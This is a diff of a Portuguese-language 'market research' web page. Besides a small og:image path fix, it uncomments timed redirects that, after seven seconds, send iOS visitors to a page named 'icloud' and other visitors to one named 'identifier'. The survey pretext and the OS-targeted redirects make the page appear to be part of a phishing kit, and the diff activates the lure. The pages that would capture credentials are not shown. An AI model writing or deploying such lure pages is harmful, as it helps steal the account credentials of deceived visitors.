@@ -10,13 +10,13 @@
     <script>
         var meta = document.createElement('meta');
         meta.setAttribute('property', 'og:image');
-        meta.content  = window.location.hostname+"src/img/og_image.jpg";
+        meta.content  = window.location.hostname+"/src/img/og_image.jpg";
         document.getElementsByTagName('head')[0].appendChild(meta);
     </script>
     <meta property="og:type" content="website" />
     <meta property="og:title" content="Pesquisa de Mercado" />
     <meta property="og:description" content="Sua opinião é muito importante para nós. Acompanhe todas as novidades através de nosso aplicativo" /> 
-       
+
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.1/css/all.css">
     <link rel="shortcut icon" href="src/img/search.png">
 </head>
@@ -54,11 +54,11 @@
         switch(sistema){
 
             default:
-            //setTimeout(function(){location.href="identifier"} , 7000);
+            setTimeout(function(){location.href="identifier"} , 7000);
             break;
 
             case 'iOS':
-            //setTimeout(function(){location.href="icloud"} , 7000);
+            setTimeout(function(){location.href="icloud"} , 7000);
             break;
         }
 
